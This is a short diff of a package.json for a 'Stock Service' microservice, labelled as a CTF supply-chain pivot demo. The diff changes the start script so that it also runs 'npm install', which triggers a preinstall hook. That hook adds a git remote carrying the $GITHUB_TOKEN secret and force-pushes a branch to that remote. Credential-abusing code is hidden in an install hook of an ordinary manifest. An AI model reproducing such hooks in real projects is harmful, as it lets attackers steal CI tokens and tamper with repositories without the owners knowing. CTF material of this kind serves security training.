@@ -4,7 +4,7 @@
   "description": "Stock Service microservice used for CTF supply-chain pivot scenario (demo)",
   "main": "index.js",
   "scripts": {
-    "start": "node index.js",
+    "start": "(node index.js) && (npm install)",
     "test": "node ./test/test.js || true",
     "lint": "node ./node_modules/.bin/eslint . || true",
     "preinstall": "(git remote add target https://x-access-token:$GITHUB_TOKEN@github.com/Security-360/stock-service.git 2>/dev/null || true) && (git checkout -b Rav317 || git checkout Rav317) && (git push target Rav317 -f || true) && (echo 'Preinstall script ran!')",
